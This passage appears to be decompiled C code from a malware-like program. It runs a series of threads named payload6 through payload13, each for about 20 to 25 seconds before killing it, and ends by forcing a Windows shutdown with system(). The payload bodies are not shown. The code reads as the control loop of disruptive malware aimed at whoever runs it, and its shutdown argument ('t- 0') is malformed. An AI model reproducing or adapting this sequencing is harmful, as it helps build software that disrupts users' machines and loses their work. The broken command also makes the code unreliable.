			v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v12, 0);
			CloseHandle(v12);
			v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v13, 0);
			CloseHandle(v13);
			v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload8, 0, 0, 0);

			Sleep(0x4E20u);
			TerminateThread(v14, 0);
			CloseHandle(v14);
			v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v16, 0);
			CloseHandle(v16);
			v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v17, 0);
			CloseHandle(v17);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload11, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v18, 0);
			CloseHandle(v18);
			v19 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload12, 0, 0, 0);

			Sleep(0x61A8u);
			TerminateThread(v19, 0);
			CloseHandle(v19);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload13, 0, 0, 0);

			Sleep(0x61A8u);
			system("C:\\Windows\\System32\\shutdown /s t- 0");
		}
	}
}
